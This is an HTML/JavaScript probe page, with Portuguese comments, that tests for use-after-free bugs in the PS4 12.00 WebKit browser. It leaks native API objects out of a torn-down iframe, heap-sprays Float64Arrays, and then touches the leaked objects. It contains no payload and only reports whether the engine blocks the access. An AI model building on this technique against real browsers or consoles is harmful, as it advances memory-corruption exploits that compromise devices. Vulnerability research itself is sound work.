
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebCore UAF Probe</title>
<style>
    body { background-color: #222; color: #ddd; font-family: sans-serif; padding: 20px; }
    button { padding: 10px; margin: 5px; cursor: pointer; background: #444; color: #fff; border: 1px solid #666; }
    button:hover { background: #666; }
    #log { background: #111; color: #0f0; padding: 15px; height: 400px; overflow-y: auto; font-family: monospace; border: 1px solid #333; margin-top: 15px; }
    iframe { border: 2px solid #f00; margin-top: 10px; background: #fff; }
</style>
</head>
<body>

<h2>PS4 12.00 - WebCore UAF Probe</h2>
<p>Testando teardown de iframes em objetos nativos C++ (DOM/Web APIs).</p>

<button onclick="startProbe('MessagePort')">Testar MessagePort</button>
<button onclick="startProbe('AudioContext')">Testar AudioContext</button>
<button onclick="startProbe('FileReader')">Testar FileReader</button>
<button onclick="startProbe('RTCPeerConnection')">Testar WebRTC</button>

<pre id="log">Aguardando início dos testes...\n</pre>
<div id="iframeContainer"></div>

<script>
function log(msg) {
    var logDiv = document.getElementById("log");
    logDiv.textContent += msg + "\n";
    logDiv.scrollTop = logDiv.scrollHeight;
}

// O Parent guardará a referência vazada e o spray de memória
var leakedObject = null;
var heapSpray = [];

function startProbe(apiType) {
    // Limpeza de testes anteriores
    leakedObject = null;
    heapSpray = [];
    document.getElementById("iframeContainer").innerHTML = "";
    
    log("\n==========================================");
    log("[*] Iniciando UAF Probe: Alvo -> " + apiType);
    log("[*] Criando iframe de ataque...");

    const iframe = document.createElement("iframe");
    iframe.style.width = "400px";
    iframe.style.height = "150px";
    document.getElementById("iframeContainer").appendChild(iframe);

    // Usa setTimeout para garantir que o iframe renderizou no DOM
    setTimeout(() => {
        const fWin = iframe.contentWindow;
        const fDoc = fWin.document;

        if (!fDoc) {
            log("[!] Erro: Não foi possível acessar o document do iframe.");
            return;
        }

        // Injetamos o tipo de API que o iframe deve testar via variável global no iframe
        fWin.targetApiType = apiType;

        fDoc.open();
        fDoc.write(`
            <!DOCTYPE html>
            <html>
            <body style="background:#ffeeb0; color:#000; font-family:sans-serif;">
            <b>Iframe (Vítima)</b><br>
            <p>Alocando e vazando objeto...</p>
            <script>
                try {
                    let targetObj = null;
                    let type = window.targetApiType;

                    // 1. ALOCAÇÃO DO OBJETO NATIVO (Isso cria backing store em C++)
                    if (type === 'MessagePort') {
                        let channel = new MessageChannel();
                        targetObj = channel.port1;
                    } else if (type === 'AudioContext') {
                        targetObj = new window.OfflineAudioContext(1, 1, 44100);
                    } else if (type === 'FileReader') {
                        targetObj = new FileReader();
                    } else if (type === 'RTCPeerConnection') {
                        targetObj = new RTCPeerConnection();
                    }

                    // 2. VAZAMENTO DE REFERÊNCIA PARA O PARENT
                    parent.leakedObject = targetObj;
                    parent.log("[+] Objeto " + type + " vazado com sucesso para o Parent.");

                    // 3. TEARDOWN (Destrói o documento e os bindings C++)
                    setTimeout(() => {
                        parent.log("[*] Iframe: Executando teardown (document.write em si mesmo)...");
                        document.open();
                        document.write("<body style='background:#fbb'><h1>Iframe Morto</h1></body>");
                        document.close();
                    }, 500);

                } catch(e) {
                    parent.log("[!] Erro no iframe ao criar " + window.targetApiType + ": " + e);
                }
            <\/script>
            </body>
            </html>
        `);
        fDoc.close();
    }, 50);

    // =========================
    // ETAPA PARENT: PÓS-TEARDOWN E VALIDAÇÃO UAF
    // =========================
    
    // Esperamos 1.5 segundos para garantir que o iframe morreu e o GC agiu
    setTimeout(() => {
        if (!leakedObject) {
            log("[-] Nenhuma referência recebida. Teste abortado.");
            return;
        }

        log("[*] Parent: Realizando Heap Spray...");
        // Tentamos ocupar a memória C++ que (teoricamente) acabou de ser liberada pelo iframe
        for (let i = 0; i < 15000; i++) {
            let arr = new Float64Array(16);
            arr.fill(1337.1337); // Valor sentinela
            heapSpray.push(arr);
        }
        log("[+] Heap Spray concluído.");

        log("[*] Parent: Tentando acessar o objeto vazado (The 'USE' in UAF)...");
        
        try {
            // Tentamos interagir com o objeto que sobreviveu
            if (apiType === 'MessagePort') {
                leakedObject.postMessage("teste");
                log("[?] Sucesso suspeito: postMessage executou sem erro. (Objeto não foi liberado).");
                
            } else if (apiType === 'AudioContext') {
                log("[?] Estado do AudioContext: " + leakedObject.state);
                log("[?] SampleRate: " + leakedObject.sampleRate);
                
            } else if (apiType === 'FileReader') {
                log("[?] Estado do FileReader (readyState): " + leakedObject.readyState);
                
            } else if (apiType === 'RTCPeerConnection') {
                log("[?] RTC signalingState: " + leakedObject.signalingState);
            }
            
            // Se chegou aqui e imprimiu valores normais: o objeto foi protegido pelo GC ou 
            // a propriedade acessada está num wrapper JS seguro que não toca no C++.
            log("[-] Conclusão: Sem UAF. O objeto C++ continua válido ou tem wrapper protetor.");

        } catch(e) {
            // Se cair aqui, a engine WebKit percebeu que o objeto raiz morreu e cortou o acesso.
            // Isso significa que há uma mitigação ativada (ex: ActiveDOMObject verifications).
            log("[!] EXCEÇÃO CAPTURADA: " + e.name + " - " + e.message);
            log("[-] Conclusão: Mitigado. O motor WebKit invalidou o ponteiro com segurança.");
        }

    }, 2000); // Roda 2 segundos após clicar no botão
}
</script>

</body>
</html>
